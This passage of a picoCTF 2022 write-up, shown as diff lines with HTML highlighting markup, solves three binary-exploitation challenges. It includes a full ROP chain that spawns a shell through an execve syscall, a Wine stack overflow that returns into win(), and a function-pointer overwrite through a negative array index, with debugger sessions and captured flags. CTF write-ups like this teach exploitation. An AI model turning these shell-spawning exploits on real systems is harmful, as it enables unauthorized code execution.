+b'<span class="hljs-tag">\<span class="hljs-name">x</span></span>83<span class="hljs-tag">\<span class="hljs-name">xc</span></span>4<span class="hljs-tag">\<span class="hljs-name">x</span></span>10<span class="hljs-tag">\<span class="hljs-name">x</span></span>83<span class="hljs-tag">\<span class="hljs-name">xf</span></span>8<span class="hljs-tag">\<span class="hljs-name">xff</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>0f<span class="hljs-tag">\<span class="hljs-name">x</span></span>84<span class="hljs-tag">\<span class="hljs-name">xba</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'<span class="hljs-tag">\<span class="hljs-name">x</span></span>87(<span class="hljs-tag">\<span class="hljs-name">xad</span></span><span class="hljs-tag">\<span class="hljs-name">xfbg</span></span><span class="hljs-tag">\<span class="hljs-name">xdd</span></span><span class="hljs-tag">\<span class="hljs-name">xfb</span></span><span class="hljs-tag">\<span class="hljs-name">xf</span></span>7g<span class="hljs-tag">\<span class="hljs-name">xdd</span></span><span class="hljs-tag">\<span class="hljs-name">xfb</span></span><span class="hljs-tag">\<span class="hljs-name">xf</span></span>7g<span class="hljs-tag">\<span class="hljs-name">xdd</span></span><span class="hljs-tag">\<span class="hljs-name">xfb</span></span><span class="hljs-tag">\<span class="hljs-name">xf</span></span>7g<span class="hljs-tag">\<span class="hljs-name">xdd</span></span><span class="hljs-tag">\<span class="hljs-name">xfb</span></span><span class="hljs-tag">\<span class="hljs-name">xf</span></span>7g<span class="hljs-tag">\<span class="hljs-name">xdd</span></span><span class="hljs-tag">\<span class="hljs-name">xfb</span></span><span class="hljs-tag">\<span class="hljs-name">xf</span></span>7g<span class="hljs-tag">\<span class="hljs-name">xdd</span></span><span class="hljs-tag">\<span class="hljs-name">xfb</span></span><span class="hljs-tag">\<span class="hljs-name">xf</span></span>7g<span class="hljs-tag">\<span class="hljs-name">xdd</span></span><span class="hljs-tag">\<span class="hljs-name">xfb</span></span><span class="hljs-tag">\<span class="hljs-name">xf</span></span>7h<span class="hljs-tag">\<span class="hljs-name">xdd</span></span><span class="hljs-tag">\<span class="hljs-name">xfb</span></span><span class="hljs-tag">\<span class="hljs-name">xf</span></span>7<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'(null)<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'setresgid<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'<span class="hljs-tag">\<span class="hljs-name">xa</span></span>0Q<span class="hljs-tag">\<span class="hljs-name">xe</span></span>3<span class="hljs-tag">\<span class="hljs-name">xf</span></span>7<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'<span class="hljs-tag">\<span class="hljs-name">x</span></span>89<span class="hljs-tag">\<span class="hljs-name">xc</span></span>7e<span class="hljs-tag">\<span class="hljs-name">xa</span></span>1<span class="hljs-tag">\<span class="hljs-name">x</span></span>0c<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'setresgid<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'CTF{L34k1ng_Fl4g_0ff_St4ck_d97b0d94}<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+b'<span class="hljs-tag">\<span class="hljs-name">xf</span></span>0<span class="hljs-tag">\<span class="hljs-name">n</span></span>'
+</code></pre><h2 id="ropfu">ropfu</h2>
+<p>This is an entirely manual ROP challenge.<br>There&#39;s no /bin/sh string (but there&#39;s room to write it in).<br>There&#39;s no system() or execve() function.<br>Instead we&#39;ll have to syscall execve(&quot;/bin/sh&quot;) manually.  </p>
+<p>You can let ROPgadget figure this one out for you:<br><code>ROPgadget --binary ./vuln --rop --badbytes &quot;0a&quot;</code></p>
+<pre><code class="lang-python">#!/usr/bin/env python3
+<span class="hljs-string">""</span>"
+execve() ROP exploit generated <span class="hljs-keyword">by</span> ROPgadget: `ROPgadget --binary ./vuln --rop --badbytes <span class="hljs-string">"0a"</span>`
+All credit goes there lmao. 
+Modified manually <span class="hljs-keyword">for</span> pwntools &amp; python3 and comments added <span class="hljs-keyword">for</span> (my own) understanding.
+
+There's <span class="hljs-keyword">no</span> system() function or any <span class="hljs-string">"/bin/sh"</span> string present <span class="hljs-keyword">in</span> the binary.  
+To get a <span class="hljs-keyword">shell</span> we need to write <span class="hljs-string">"/bin/sh"</span> to <span class="hljs-keyword">memory</span> and execute execve() via syscall().
+
+execve()'s syscall number is 11 / 0x0b, <span class="hljs-keyword">so</span> we need to <span class="hljs-keyword">do</span>:  
+syscall(0x0b, <span class="hljs-string">"/bin/sh"</span>, NULL, NULL)
+
+<span class="hljs-keyword">So</span> we need to <span class="hljs-keyword">set</span> up our registers to look like this:  
+EAX: 0x0b  
+EBX: pointer to /bin/<span class="hljs-keyword">sh</span>  
+ECX: pointer to NULL  
+EDX: pointer to NULL  
+before calling `int 0x80` to syscall.
+
+The .data section is writable @ 0x080e5060 - `rabin2 -S vuln`.  
+There we can write our arguments.  
+Using the gadgets available <span class="hljs-keyword">in</span> the binary, this is how we can write <span class="hljs-string">"/bin/sh"</span> to .data <span class="hljs-keyword">memory</span>:  
+- write .data address to <span class="hljs-keyword">stack</span> and pop it into EDX
+- write <span class="hljs-string">"/bin"</span> to <span class="hljs-keyword">stack</span> and pop it into EAX
+- <span class="hljs-keyword">move</span> data <span class="hljs-keyword">in</span> eax to <span class="hljs-keyword">memory</span> pointed to <span class="hljs-keyword">by</span> EDX
+
+And <span class="hljs-keyword">repeat</span> <span class="hljs-keyword">for</span> <span class="hljs-string">"/sh"</span>, <span class="hljs-keyword">as</span> well <span class="hljs-keyword">as</span> our execve() NULL arguments.  
+Have to write <span class="hljs-string">"/bin/sh"</span> (8 bytes long) <span class="hljs-keyword">in</span> 2 parts because this is x86 and registers can only store 4 bytes.
+<span class="hljs-string">""</span>"
+from pwn import *
+from struct import pack
+
+#io = process(<span class="hljs-string">"./vuln"</span>)
+io = remote(<span class="hljs-string">"saturn.picoctf.net"</span>, 56166)
+
+p = b'A'*28          # Offset to EIP
+
+                     # Part 1 - Write <span class="hljs-string">"/bin/sh"</span> to .data <span class="hljs-keyword">memory</span> <span class="hljs-keyword">in</span> 2 parts
+                     # <span class="hljs-keyword">Move</span> .data address into edx
+p += p32(0x080583c9) # pop edx ; pop ebx ; <span class="hljs-keyword">ret</span>
+p += p32(0x080e5060) # @ .data
+p += p32(0x41414141) # padding
+                     # Pop <span class="hljs-string">"/bin"</span> from <span class="hljs-keyword">stack</span> into eax
+p += p32(0x080b074a) # pop eax ; <span class="hljs-keyword">ret</span>
+p += b'/bin'
+                     # <span class="hljs-keyword">Move</span> <span class="hljs-string">"/bin"</span> from eax to .data <span class="hljs-keyword">memory</span>
+p += p32(0x08059102) # <span class="hljs-keyword">mov</span> dword ptr [edx], eax ; <span class="hljs-keyword">ret</span>
+                     # <span class="hljs-keyword">Move</span> .data address + 4 into edx
+p += p32(0x080583c9) # pop edx ; pop ebx ; <span class="hljs-keyword">ret</span>
+p += p32(0x080e5064) # @ .data + 4
+p += p32(0x41414141) # padding
+                     # Pop <span class="hljs-string">"/shNULL"</span> from <span class="hljs-keyword">stack</span> into eax
+p += p32(0x080b074a) # pop eax ; <span class="hljs-keyword">ret</span>
+p += b'<span class="hljs-comment">//sh'</span>
+                     # <span class="hljs-keyword">Move</span> <span class="hljs-string">"/shNULL"</span> from eax to .data <span class="hljs-keyword">memory</span>
+p += p32(0x08059102) # <span class="hljs-keyword">mov</span> dword ptr [edx], eax ; <span class="hljs-keyword">ret</span>
+
+                     # Part 2- Write NULL to .data <span class="hljs-keyword">memory</span>
+                     # <span class="hljs-keyword">Move</span> .data address + 8 into edx
+p += p32(0x080583c9) # pop edx ; pop ebx ; <span class="hljs-keyword">ret</span>
+p += p32(0x080e5068) # @ .data + 8
+p += p32(0x41414141) # padding
+                     # <span class="hljs-keyword">Set</span> EAX to 4 NULLs
+p += p32(0x0804fb90) # xor eax, eax ; <span class="hljs-keyword">ret</span>
+                     # <span class="hljs-keyword">Move</span> 4 NULLs from eax to .data <span class="hljs-keyword">memory</span>
+p += p32(0x08059102) # <span class="hljs-keyword">mov</span> dword ptr [edx], eax ; <span class="hljs-keyword">ret</span>
+
+                     # Part 3 - <span class="hljs-keyword">Set</span> up registers &amp; syscall()
+                     # <span class="hljs-keyword">Set</span> ECX to pointer to NULL
+p += p32(0x08049e39) # pop ecx ; <span class="hljs-keyword">ret</span>
+p += p32(0x080e5068) # @ .data + 8
+                     # <span class="hljs-keyword">Set</span> EDX to pointer to NULL and EBX to pointer to <span class="hljs-string">"/bin/sh/"</span>
+p += p32(0x080583c9) # pop edx ; pop ebx ; <span class="hljs-keyword">ret</span>
+p += p32(0x080e5068) # @ .data + 8
+p += p32(0x080e5060) # @ .data + 0
+                     # <span class="hljs-keyword">Set</span> EAX to 0x0b, the syscall number <span class="hljs-keyword">for</span> execve()
+p += p32(0x0804fb90) # xor eax, eax ; <span class="hljs-keyword">ret</span>
+p += p32(0x0808055e) * 0xb
+                     # syscall()
+p += p32(0x0804a3d2) # int 0x80
+
+io.sendlineafter(<span class="hljs-string">"grasshopper!\n"</span>, p)
+io.interactive()
+</code></pre>
+<h2 id="wine">wine</h2>
+<p>Never exploited anything through wine before. Was interesting.<br>Lots of credit goes to this article for a good introduction on wine (and gdb + wine).<br><a href="https://schlafwandler.github.io/posts/attacking-wine-part-i/">https://schlafwandler.github.io/posts/attacking-wine-part-i/</a></p>
+<p>Run the binary.</p>
+<pre><code>┌──(<span class="hljs-selector-tag">horace</span>@<span class="hljs-keyword">kali</span>)-[~/<span class="hljs-keyword">ctf</span>/<span class="hljs-keyword">pico22</span>/<span class="hljs-keyword">wine</span>]
+└─$ wine vuln.exe                                 <span class="hljs-number">5</span> ⨯
+Give me a string!
+</code></pre><p>Attach to it with gdb.</p>
+<pre><code>┌──(horace<span class="hljs-variable">@kali</span>)-[~<span class="hljs-regexp">/ctf/pico</span>22/wine]
+└─<span class="hljs-variable">$ </span>gdb -q -p <span class="hljs-variable">$(</span>pgrep -f vuln.exe)
+...
+gdb-peda<span class="hljs-variable">$ </span>c
+Continuing.
+</code></pre><p>Generate a cyclic pattern.</p>
+<pre><code>┌──(<span class="hljs-selector-tag">horace</span>@<span class="hljs-keyword">kali</span>)-[~/<span class="hljs-keyword">ctf</span>/<span class="hljs-keyword">pico22</span>/<span class="hljs-keyword">wine</span>]
+└─$ pwn cyclic <span class="hljs-number">240</span>          
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaac
+</code></pre><p>Submit it and crash the program.</p>
+<pre><code>Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+<span class="hljs-symbol">EAX:</span> <span class="hljs-number">0x64fd90</span> (<span class="hljs-string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"</span>...)
+<span class="hljs-symbol">EBX:</span> <span class="hljs-number">0x230ecc</span> --&gt; <span class="hljs-number">0x0</span> 
+<span class="hljs-symbol">ECX:</span> <span class="hljs-number">0x64fd80</span> --&gt; <span class="hljs-number">0x64fd90</span> (<span class="hljs-string">"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"</span>...)
+<span class="hljs-symbol">EDX:</span> <span class="hljs-number">0x7fa348b8</span> --&gt; <span class="hljs-number">0xffffffff</span> 
+<span class="hljs-symbol">ESI:</span> <span class="hljs-number">0x28</span> (<span class="hljs-string">'('</span>)
+<span class="hljs-symbol">EDI:</span> <span class="hljs-number">0x1119b4</span> --&gt; <span class="hljs-number">0x0</span> 
+<span class="hljs-symbol">EBP:</span> <span class="hljs-number">0x6261616a</span> (<span class="hljs-string">'jaab'</span>)
+<span class="hljs-symbol">ESP:</span> <span class="hljs-number">0x64fe20</span> (<span class="hljs-string">"laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaac"</span>)
+<span class="hljs-symbol">EIP:</span> <span class="hljs-number">0x6261616b</span> (<span class="hljs-string">'kaab'</span>)
+<span class="hljs-symbol">EFLAGS:</span> <span class="hljs-number">0x10246</span> (carry PARITY adjust <span class="hljs-meta">ZERO</span> sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: <span class="hljs-number">0x6261616b</span>
+[------------------------------------stack-------------------------------------]
+<span class="hljs-number">0000</span>| <span class="hljs-number">0x64fe20</span> (<span class="hljs-string">"laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaac"</span>)
+<span class="hljs-number">0004</span>| <span class="hljs-number">0x64fe24</span> (<span class="hljs-string">"maabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaac"</span>)
+<span class="hljs-number">0008</span>| <span class="hljs-number">0x64fe28</span> (<span class="hljs-string">"naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaac"</span>)
+<span class="hljs-number">0012</span>| <span class="hljs-number">0x64fe2c</span> (<span class="hljs-string">"oaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaac"</span>)
+<span class="hljs-number">0016</span>| <span class="hljs-number">0x64fe30</span> (<span class="hljs-string">"paabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaac"</span>)
+<span class="hljs-number">0020</span>| <span class="hljs-number">0x64fe34</span> (<span class="hljs-string">"qaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaac"</span>)
+<span class="hljs-number">0024</span>| <span class="hljs-number">0x64fe38</span> (<span class="hljs-string">"raabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaac"</span>)
+<span class="hljs-number">0028</span>| <span class="hljs-number">0x64fe3c</span> (<span class="hljs-string">"saabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaac"</span>)
+[------------------------------------------------------------------------------]
+<span class="hljs-symbol">Legend:</span> code, data, rodata, value
+Stopped reason: SIGSEGV
+<span class="hljs-number">0x6261616b</span> <span class="hljs-keyword">in</span> ?? ()
+</code></pre><p>Grab the offset to overwrite EIP.</p>
+<pre><code>┌──(<span class="hljs-selector-tag">horace</span>@<span class="hljs-keyword">kali</span>)-[~/<span class="hljs-keyword">ctf</span>/<span class="hljs-keyword">pico22</span>/<span class="hljs-keyword">wine</span>]
+└─$ pwn cyclic -l <span class="hljs-number">0</span>x6261616b
+<span class="hljs-number">140</span>
+</code></pre><p>Find the address of the win() function.</p>
+<pre><code>┌──(<span class="hljs-selector-tag">horace</span>@<span class="hljs-keyword">kali</span>)-[~/<span class="hljs-keyword">ctf</span>/<span class="hljs-keyword">pico22</span>/<span class="hljs-keyword">wine</span>]
+└─$ nm vuln.exe | grep win
+<span class="hljs-number">004053</span>dc B ___mingw_winmain_hInstance
+<span class="hljs-number">004053</span>d8 B ___mingw_winmain_lpCmdLine
+<span class="hljs-number">00403000</span> D ___mingw_winmain_nShowCmd
+<span class="hljs-number">00401530</span> T _win
+</code></pre><p>Code our exploit.</p>
+<pre><code class="lang-python">#!/usr/bin/env python3
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.log_level = <span class="hljs-string">'debug'</span>
+
+#<span class="hljs-built_in">io</span> = process([<span class="hljs-string">"wine"</span>, <span class="hljs-string">"./vuln.exe"</span>])
+<span class="hljs-built_in">io</span> = remote(<span class="hljs-string">"saturn.picoctf.net"</span>, <span class="hljs-number">63546</span>)
+
+p  = b<span class="hljs-string">"A"</span>*<span class="hljs-number">140</span>           # offset to EIP
+p += p32(<span class="hljs-number">0x00401530</span>)    # win()
+
+<span class="hljs-built_in">io</span>.sendlineafter(b<span class="hljs-string">'Give me a string!\r\n'</span>, p)
+<span class="hljs-built_in">io</span>.recv()
+<span class="hljs-built_in">io</span>.close()
+</code></pre>
+<p>And get the flag.</p>
+<pre><code>┌──(horace@kali)-[~/ctf/pico22/wine]
+└─$ python3 exp.py                             <span class="hljs-number"> 130 </span>⨯
+[+] Opening connection to saturn.picoctf.net on port 63546: Done
+[DEBUG] Received 0x13 bytes:
+    b'Give me a string!\r\n'
+[DEBUG] Sent 0x91 bytes:
+   <span class="hljs-number"> 00000000 </span><span class="hljs-number"> 41 </span>41<span class="hljs-number"> 41 </span>41 <span class="hljs-number"> 41 </span>41<span class="hljs-number"> 41 </span>41 <span class="hljs-number"> 41 </span>41<span class="hljs-number"> 41 </span>41 <span class="hljs-number"> 41 </span>41<span class="hljs-number"> 41 </span>41  │AAAA│AAAA│AAAA│AAAA│
+    *
+   <span class="hljs-number"> 00000080 </span><span class="hljs-number"> 41 </span>41<span class="hljs-number"> 41 </span>41 <span class="hljs-number"> 41 </span>41<span class="hljs-number"> 41 </span>41 <span class="hljs-number"> 41 </span>41<span class="hljs-number"> 41 </span>41 <span class="hljs-number"> 30 </span>15<span class="hljs-number"> 40 </span>00  │AAAA│AAAA│AAAA│0·@·│
+   <span class="hljs-number"> 00000090 </span> 0a                                                  │·│
+    00000091
+[DEBUG] Received 0x23 bytes:
+    b'picoCTF{Un_v3rr3_d3_v1n_11eef972}\r\n'
+[*] Closed connection to saturn.picoctf.net port 63546
+</code></pre><h2 id="function-overwrite">function-overwrite</h2>
+<p>In my opinion this challenge is about data types and format specifies in C.</p>
+<p><code>easy_checker()</code> and <code>hard_checker()</code> both print the flag, but only if our story is rated as <code>1337</code>.</p>
+<p><code>calculate_story_score()</code> rates the story.<br>It will take the ASCII value of each character in the story and add them together.<br>e.g. &quot;hello&quot;&#39;s score is 532 (h = 104, e = 101, etc.)<br>Therefore, to get a score of 1337 we can submit <code>zzzzzzzzzzu</code>.<br>A score of 13371337 isn&#39;t possible because we only have 127 characters of space for our story, and there isn&#39;t an ASCII value * 127 that can reach 13371337.</p>
+<p>This is why we need to modify <code>check</code>, which currently points to <code>hard_checker</code>, to point to <code>easy_checker</code>.</p>
+<p>At this number prompt in <code>vuln()</code> we can submit 2 numbers:</p>
+<pre><code class="lang-c">void (*check)(char*, size_t) = hard_checker;
+int <span class="hljs-function"><span class="hljs-keyword">fun</span>[10] = {0};</span>
+
+void vuln()
+{
+    ...
+    printf(<span class="hljs-string">"On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n"</span>);
+    scanf(<span class="hljs-string">"%d %d"</span>, &amp;num1, &amp;num2);
+
+    <span class="hljs-keyword">if</span> (num1 &lt; <span class="hljs-number">10</span>)
+    {
+    <span class="hljs-function"><span class="hljs-keyword">fun</span>[num1] += num2;</span>
+    }
+</code></pre>
+<p>And then <code>num1</code> is added to the data pointed to by <code>fun[num1]</code>.</p>
+<p>If we submit a negative number we can write to earlier memory addresses, like <code>check</code>.<br>Note that <code>scanf</code> is taking decimal numbers (<code>%d</code>), therfore all numbers you submit have to be decimal not hex.  </p>
+<p>You find the numbers to give via gdb (probably), but since we have the source code I modified that and did trial and error.</p>
+<p>Here&#39;s my modified vuln() function.</p>
+<pre><code class="lang-c">void (*check)(char*, size_t) = hard_checker;
+<span class="hljs-keyword">int</span> fun[<span class="hljs-number">10</span>] = <span class="hljs-string">{0}</span>;
+
+void vuln()
+{
+  <span class="hljs-keyword">printf</span>(<span class="hljs-string">"hard_checker addr: 0x%p \n"</span>, &amp;hard_checker);
+  <span class="hljs-keyword">printf</span>(<span class="hljs-string">"easy_checker addr: 0x%p \n"</span>, &amp;easy_checker);
+  <span class="hljs-keyword">printf</span>(<span class="hljs-string">"addr in check(): 0x%p \n"</span>, check);
+  <span class="hljs-keyword">printf</span>(<span class="hljs-string">"check() addr: 0x%p \n"</span>, &amp;check);
+  char story[<span class="hljs-number">128</span>];
+  <span class="hljs-keyword">int</span> num1, num2;
+
+  <span class="hljs-keyword">printf</span>(<span class="hljs-string">"Tell me a story and then I'll tell you if you're a 1337 &gt;&gt; "</span>);
+  scanf(<span class="hljs-string">"%127s"</span>, story);
+  <span class="hljs-keyword">printf</span>(<span class="hljs-string">"On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n"</span>);
+  scanf(<span class="hljs-string">"%d %d"</span>, &amp;num1, &amp;num2);
+
+  <span class="hljs-keyword">printf</span>(<span class="hljs-string">"fun[%d] addr: 0x%p \n"</span>, num1, &amp;fun[num1]);
+
+  <span class="hljs-keyword">if</span> (num1 &lt; <span class="hljs-number">10</span>)
+  {
+    fun[num1] += num2;
+  }
+
+  <span class="hljs-keyword">printf</span>(<span class="hljs-string">"addr in check(): 0x%p \n"</span>, check);
+  check(story, strlen(story));
+}
+</code></pre>
+<p>Compile: 
+<code>gcc vuln.c -o myvuln -fno-stack-protector -D_FORTIFY_SOURCE=0 -z execstack -no-pie -m32</code></p>
+<p>And here&#39;s the output when I got the flag locally.<br>My numbers were -16 and -313.</p>
+<pre><code>┌──(horace@kali)-[~/ctf/pico22/<span class="hljs-function"><span class="hljs-keyword">function</span>-overwrite]</span>
+└─$ ./myvuln                                          
+hard_checker addr: <span class="hljs-number">0x0</span>x80493df 
+easy_checker addr: <span class="hljs-number">0x0</span>x80492a6 
+addr <span class="hljs-keyword">in</span> check(): <span class="hljs-number">0x0</span>x80493df 
+check() addr: <span class="hljs-number">0x0</span>x804c040 
+Tell me <span class="hljs-keyword">a</span> story <span class="hljs-keyword">and</span> <span class="hljs-keyword">then</span> I<span class="hljs-string">'ll tell you if you'</span>re <span class="hljs-keyword">a</span> <span class="hljs-number">1337</span> &gt;&gt; zzzzzzzzzzu
+On <span class="hljs-keyword">a</span> totally unrelated note, give me <span class="hljs-literal">two</span> numbers. Keep <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> <span class="hljs-literal">one</span> less than <span class="hljs-number">10.</span>
+<span class="hljs-number">-16</span>
+<span class="hljs-number">-313</span>
+fun[<span class="hljs-number">-16</span>] addr: <span class="hljs-number">0x0</span>x804c040 
+addr <span class="hljs-keyword">in</span> check(): <span class="hljs-number">0x0</span>x80492a6 
+score: <span class="hljs-number">1337</span> 
+Please <span class="hljs-built_in">create</span> <span class="hljs-string">'flag.txt'</span> <span class="hljs-keyword">in</span> this <span class="hljs-built_in">directory</span> <span class="hljs-keyword">with</span> your own debugging flag.
+</code></pre><p>The same works remotely too (memory offsets remain the same).</p>
+<pre><code>┌──(horace@kali)-[~/ctf/pico22/function-overwrite]
+└─$ ./connect.sh 
+Tell me a story <span class="hljs-keyword">and</span> then I<span class="hljs-string">'ll tell you if you'</span>re a <span class="hljs-number">1337</span> &gt;&gt; zzzzzzzzzzu
+On a totally unrelated note, give me two numbers. Keep the first one less than <span class="hljs-number">10.</span>
+<span class="hljs-number">-16</span>
+<span class="hljs-number">-313</span>
+Yo<span class="hljs-string">u're 1337. Here'</span>s the flag.
+picoCTF{<span class="hljs-number">0</span>v3rwrit1ng_P01nt3rs_789b0a98}
+</code></pre>
